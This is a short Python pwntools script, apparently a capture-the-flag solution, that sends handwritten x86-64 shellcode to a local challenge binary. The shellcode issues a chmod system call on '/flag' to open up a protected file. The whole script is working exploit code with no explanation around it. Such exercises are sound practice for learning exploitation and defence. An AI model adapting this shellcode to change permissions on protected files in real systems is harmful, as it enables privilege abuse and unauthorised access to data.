#!/usr/bin/python3

from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'error'
context.arch = "amd64"
elf = context.binary = ELF('/challenge/diverse-delivery')

#shellcode = open("shellcode_raw","rb").read()
shellcode = asm("""
mov al, 90
push 7
pop rsi
lea rdi, [rdx+11]
syscall
filename:
        .string "/flag"
""")

io = process()

io.send(shellcode)
io.interactive()
